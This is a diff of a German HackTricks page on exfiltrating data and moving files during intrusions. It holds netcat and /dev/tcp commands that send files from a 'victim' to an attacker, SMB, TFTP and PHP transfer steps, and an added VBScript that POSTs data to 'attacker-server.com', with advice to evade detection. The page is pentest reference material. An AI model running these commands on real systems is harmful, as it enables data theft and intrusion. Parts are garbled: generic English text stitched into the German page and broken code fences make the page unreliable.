@@ -10,15 +10,23 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.
 
 </details>
+
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
 
 ## Häufig weißgelistete Domains zum Exfiltrieren von Informationen
 
 Überprüfen Sie [https://lots-project.com/](https://lots-project.com/), um häufig weißgelistete Domains zu finden, die missbraucht werden können
 
-## Kopieren\&Einfügen Base64
+## Kopieren & Einfügen Base64
 
 **Linux**
 ```bash
@@ -181,37 +189,25 @@ service smbd restart
 
 ## Introduction
 
-Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as using external storage devices, email, or network protocols.
+Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as using external storage devices, email, or network communication.
 
 ## Techniques
 
 ### Data Compression
 
-Data can be compressed before exfiltration to reduce its size and avoid detection.
+Data can be compressed before exfiltration to reduce its size, making it easier to transfer without raising suspicion.
 
 ### Data Encryption
 
-Encrypting the data before exfiltration can prevent unauthorized access to the information.
+Encrypting the exfiltrated data can help prevent detection by security measures, as the content will appear as random characters without the decryption key.
 
 ### Steganography
 
-Steganography involves hiding data within other files or images to avoid detection.
-
-### Protocol Tunneling
-
-Protocol tunneling can be used to encapsulate exfiltrated data within legitimate network protocols to bypass security measures.
+Steganography involves hiding data within other files or images to avoid detection. This can be a useful technique for exfiltrating data covertly.
 
 ## Tools
 
-Various tools are available to assist in data exfiltration, such as:
-
-- **Netcat**: A versatile networking utility that can be used for exfiltration.
-- **Cobalt Strike**: A popular penetration testing tool that includes features for data exfiltration.
-- **PowerShell**: Built-in Windows tool that can be used for exfiltration tasks.
-
-## Conclusion
-
-Exfiltration is a critical phase in the cyber attack lifecycle, and understanding the various techniques and tools available is essential for both attackers and defenders.
+There are various tools available for exfiltrating data, including custom scripts, open-source software, and commercial solutions. It is important to choose the right tool based on the specific exfiltration requirements and the target system's environment.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -233,7 +229,7 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## Netzwerk-Covertness
+## Netzwerk-Kommunikation
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -246,8 +242,6 @@ nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
 ### Datei auf das Opfer hochladen
-
-Wenn Sie Zugriff auf das Opfersystem haben, können Sie Dateien auf das System hochladen, um sensible Daten zu exfiltrieren. Dies kann über verschiedene Methoden wie Remote-Verwaltungstools, Dateifreigabe oder sogar über E-Mail-Anhänge erfolgen. Stellen Sie sicher, dass Sie die erforderlichen Berechtigungen haben und dass die hochgeladenen Dateien nicht entdeckt werden.
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -284,7 +278,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 Standardmäßig in XP und 2003 (bei anderen muss es während der Installation explizit hinzugefügt werden)
 
-In Kali **TFTP-Server starten**:
+In Kali **starten Sie den TFTP-Server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -296,7 +290,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Auf dem **Opfer** verbinden Sie sich mit dem Kali-Server:
+In **Opfer**, verbinden Sie sich mit dem Kali-Server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -308,7 +302,22 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-VBScript ist eine von Microsoft entwickelte Skriptsprache, die in Windows-Umgebungen häufig verwendet wird. Es kann verwendet werden, um Dateien zu exfiltrieren, indem es sie in Base64 kodiert und dann in einer HTTP-Anfrage an einen Remote-Server sendet. Dies ermöglicht es einem Angreifer, Daten aus einem kompromittierten System herauszuziehen.
+### Exfiltration
+
+VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method and target URL, and sending the data in the request body. The following example demonstrates how data can be exfiltrated using VBScript:
+
+```vbscript
+Dim objHTTP, strData
+Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+strData = "SensitiveDataToExfiltrate"
+objHTTP.Open "POST", "http://attacker-server.com/exfiltrate.php", False
+objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+objHTTP.send strData
+```
+
+In this example, the VBScript code creates an HTTP POST request to `http://attacker-server.com/exfiltrate.php` with the data `SensitiveDataToExfiltrate` in the request body. The attacker can then receive and process this data on their server.
+
+It is important to note that exfiltrating data using VBScript may trigger security controls or be detected by security solutions, so it is crucial to implement obfuscation techniques and evade detection mechanisms to increase the chances of successful exfiltration.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -346,13 +355,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Das Programm `debug.exe` ermöglicht nicht nur die Inspektion von Binärdateien, sondern hat auch die **Fähigkeit, sie aus Hexadezimalwerten neu zu erstellen**. Das bedeutet, dass `debug.exe` anhand eines Hexadezimalwerts einer Binärdatei die Binärdatei generieren kann. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung beim Zusammenstellen von Dateien bis zu 64 KB Größe** hat.
+Das Programm `debug.exe` ermöglicht nicht nur die Inspektion von Binärdateien, sondern hat auch die **Fähigkeit, sie aus Hexadezimalwerten neu zu erstellen**. Das bedeutet, dass `debug.exe` anhand einer Hexadezimaldarstellung einer Binärdatei die Binärdatei generieren kann. Es ist jedoch wichtig zu beachten, dass `debug.exe` eine **Einschränkung beim Zusammenstellen von Dateien bis zu 64 KB Größe** hat.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```html
+```markdown
 Dann kopieren Sie den Text in die Windows-Shell, und eine Datei namens nc.exe wird erstellt.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
@@ -361,6 +370,11 @@ Dann kopieren Sie den Text in die Windows-Shell, und eine Datei namens nc.exe wi
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
@@ -372,7 +386,7 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.
 
 </details>
 ```
